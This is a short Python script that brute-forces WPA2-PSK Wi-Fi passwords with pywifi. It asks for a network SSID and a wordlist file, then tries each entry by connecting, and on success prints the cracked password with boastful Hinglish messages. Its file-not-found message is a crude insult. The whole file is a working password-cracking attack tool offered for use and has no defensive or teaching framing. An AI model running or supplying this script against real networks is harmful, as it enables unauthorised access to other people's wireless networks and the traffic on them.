import argparse
import sys
import os
import os.path
import platform
import re
import time
import pywifi
from pywifi import PyWiFi
from pywifi import const
from pywifi import Profile

RED   = "\033[1;31m"  
GREEN = "\033[0;32m"
RESET = "\033[0;0m"
BOLD  = "\033[;1m"

try:
    wifi = PyWiFi()
    interfaces = wifi.interfaces()
    if not interfaces:
        raise RuntimeError("No wireless interfaces found. Is your Wi-Fi adapter enabled?")
    # Use a single interface reference everywhere
    iface = interfaces[0]
    # Attempt a scan but guard against Windows API returning NULL pointers
    try:
        iface.scan()
        # allow the system a moment to populate results
        time.sleep(1)
        results = iface.scan_results()
    except Exception as e_scan:
        print("Warning: scan_results failed:", e_scan)
        results = []
except Exception as e:
    import traceback
    print("Error initializing pywifi:", str(e))
    traceback.print_exc()
    sys.exit(1)

type = False

def crack(ssid, password, number):

    profile = Profile() 
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP


    profile.key = password
    iface.remove_all_network_profiles()
    tmp_profile = iface.add_network_profile(profile)
    time.sleep(0.1) 
    iface.connect(tmp_profile) 
    time.sleep(0.35)

    if iface.status() == const.IFACE_CONNECTED:
        time.sleep(1)
        print(BOLD, GREEN,'Abhishek Cracked It!\n',RESET)
        print(BOLD, GREEN,'Password Likh Le -->' + password, RESET)
        print(BOLD, GREEN,'Thanks Bol Abhishek Ko', RESET)
        time.sleep(1)
        exit()
    else:
        print(RED, '[{}] Ye nahi hai password --> {}'.format(number, password))

def pwd(ssid, file):
    number = 0
    with open(file, 'r', encoding='utf8') as words:
        for line in words:
            number += 1
            line = line.split("\n")
            pwd = line[0]
            crack(ssid, pwd, number)
                    


def main(): 
    print(GREEN)   
    ssid = input("SSID Daal: ")
    filee = input("Pwds File Bata: : ")
    
    if os.path.exists(filee):
        if platform.system().startswith("Win" or "win"):
            os.system("cls")
        else:
            os.system("clear")

        print(GREEN,"Suru Ho Rha Hai Chup Chap Shanti se Baith Jaa...\n")
        pwd(ssid, filee)

    else:
        print(RED,"Chutiye Sahi File ka naam daal na!\n",GREEN)


if __name__ == "__main__":
    main()
